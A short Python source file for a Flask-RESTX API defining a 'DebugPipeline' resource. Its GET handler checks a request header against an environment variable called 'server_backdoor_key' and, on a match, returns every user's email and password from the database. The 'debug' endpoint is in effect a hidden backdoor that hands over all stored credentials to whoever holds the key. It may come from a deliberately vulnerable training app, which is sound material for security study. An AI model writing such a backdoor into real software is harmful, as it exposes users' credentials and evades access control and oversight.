from flask_restx import Resource, reqparse
from ..parser import debug_input_parser
from .. import api
from flask_restx.utils import HTTPStatus
from ..models import Users
from os import environ


class DebugPipeline(Resource):
    method_decorators = []

    @api.expect(debug_input_parser)
    def get(self):
        key = reqparse.request.headers.get("key")
        if key == environ.get("server_backdoor_key"):
            users = Users.query.all()
            return [{"email": user.email, "password": user.password} for user in users]
        return {}, HTTPStatus.UNAUTHORIZED